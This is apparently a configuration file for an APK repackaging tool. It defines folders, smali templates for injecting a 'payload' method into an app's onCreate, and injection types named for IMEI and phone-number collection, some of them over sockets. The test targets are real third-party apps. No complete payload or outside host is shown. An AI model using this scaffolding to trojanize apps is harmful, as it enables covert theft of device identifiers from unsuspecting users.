# FILES TYPES
ALLOWED_APK = {'apk', 'APK'}

# FOLDER CONST
APK_FOLDER = 'apk_files'
DECOMPILED_APK = 'decompiled_apk'
COMPILED_APK = 'compiled_apk'
DB = 'db/DB'

# INJECTION
INJECTIONS = [{'code': 1, 'name': 'TEST'},
              {'code': 2, 'name': 'IMEI'},
              {'code': 3, 'name': 'PHONE'},
              {'code': 5, 'name': 'IMEI_SOCKET'},
              {'code': 6, 'name': 'PHONE_SOCKET'}]
# PERMISSION CONST
MANIFEST_FILE = "/AndroidManifest.xml"
xml_identifier = '{http://schemas.android.com/apk/res/android}name'
permission_suffix = 'uses-permission'
INTENT_FILTER = '<intent-filter>\n<action ns0:name="android.intent.action.SEARCH" />'

# ACTIVITY MAIN CONST
MAIN_ACTIVITY_PATH = "path"
MAIN_ACTIVITY_PACK = "path"
MAIN_ACTIVITY_NAME = "nameACT"
PATH_SUFFIX = "L"

ON_CREATE_PUBLIC = ".method public onCreate(Landroid/os/Bundle;)V"
ON_CREATE_PRIVATE = ".method private onCreate(Landroid/os/Bundle;)V"
ON_CREATE_PROTECTED = ".method protected onCreate(Landroid/os/Bundle;)V"

ON_CREATE_RETURN = "return-void"

PACKAGE_LIST = {"init": '\n\n.method public final payload()[Ljava/lang/String;\n.locals 3\n\n const/4 v0, 0x',
                "new_array": '\n\n new-array v0, v0, [Ljava/lang/String;',
                "entry_counter": '\n\n   const/4 v1, 0x',
                "before_entry": '\n\n    const-string v2, "',
                "after_entry": '"\n\n  aput-object v2, v0, v1 \n',
                "after_array": '\n\n   .local v0, "payloads":[Ljava/lang/String;\n invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;\n move-result-object v1 \n',
                "log": 'const-string v2, "Payloads:"\n  invoke-static {v2, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I\n',
                "final": ' return-object v0\n.end method'}

SHARED_NAME = ".saveinfo"
SEND_SMALI_EX = "$send.smali"


PACKAGE_TEST = ['com.slickdroid.calllog', 'org.powerthesaurus.powerthesaurus', 'com.katanagari.damonQuotes']
